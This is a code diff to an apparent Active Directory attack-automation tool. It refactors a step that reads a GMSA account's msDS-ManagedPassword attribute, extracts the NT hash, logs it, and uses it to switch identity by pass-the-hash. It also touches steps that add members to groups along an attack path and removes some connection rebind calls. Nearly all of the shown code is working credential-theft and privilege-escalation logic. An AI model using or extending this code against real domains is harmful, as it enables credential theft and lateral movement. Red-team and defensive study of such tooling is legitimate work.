@@ -69,7 +69,6 @@ class Automation:
             
         self.conn = ConnectionHandler(self.co_args)
         await self._unfold()
-        await self.conn.rebind()
 
     async def _unfold(self):
         for rel in self.path:
@@ -150,7 +149,6 @@ class Automation:
             member = rel["start_node"]["objectid"]
             group = rel["end_node"]["distinguishedname"]
             await add_operation(self.conn, group, member)
-            await self.conn.rebind()
         self.dirty_laundry.append({"f": remove.groupMember, "args": [group, member]})
 
     async def _aclGroup(self, rel):
@@ -223,41 +221,31 @@ class Automation:
             target_dn = rel["end_node"]["distinguishedname"]
             
             # Read msDS-ManagedPassword attribute from the GMSA account
-            # This returns a list with one dictionary like [{'NTLM': 'hash'}]
-            password_data = None
+            # This returns a list with one dictionary like [{'NT': 'hash', 'B64ENCODED': 'base64string'}]
+            nthash = None
             async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                 if "msDS-ManagedPassword" in entry:
-                    password_data = entry["msDS-ManagedPassword"]
+                    nthash = entry["msDS-ManagedPassword"][0]['NT']
                     break
-            
-            if password_data:
-                # Extract NT hash from the dictionary
-                nthash = None
-                if isinstance(password_data, list) and len(password_data) > 0:
-                    if 'NTLM' in password_data[0]:
-                        nthash = password_data[0]['NTLM']
                 
-                if nthash:
-                    LOG.info(f"Retrieved GMSA NT hash: {nthash}")
-                    print(f"[+] GMSA NT hash retrieved: {nthash}")
-                    
-                    # Get the sAMAccountName for the GMSA account
-                    ldap = await self.conn.getLdap()
-                    user_entry = None
-                    async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
-                        user_entry = entry
-                        break
-                    
-                    if user_entry:
-                        user = user_entry["sAMAccountName"]
-                        # Pass NT hash in the format ":nt_hash" for NTLM authentication
-                        pwd = f":{nthash}"
-                        LOG.info(f"Switching to GMSA account: {user}")
-                        await self._switchUser(user, pwd)
-                    else:
-                        LOG.warning("Could not retrieve sAMAccountName for GMSA account")
+            if nthash:
+                LOG.info(f"Retrieved GMSA NT hash: {nthash}")
+                
+                # Get the sAMAccountName for the GMSA account
+                ldap = await self.conn.getLdap()
+                user_entry = None
+                async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
+                    user_entry = entry
+                    break
+                
+                if user_entry:
+                    user = user_entry["sAMAccountName"]
+                    # Pass NT hash in the format ":nt_hash" for NTLM authentication
+                    pwd = ":"+nthash
+                    LOG.info(f"Switching to GMSA account: {user}")
+                    await self._switchUser(user, pwd)
                 else:
-                    LOG.error("Failed to extract NT hash from GMSA password data")
+                    LOG.warning("Could not retrieve sAMAccountName for GMSA account")
             else:
                 LOG.error("Failed to retrieve GMSA password")
 
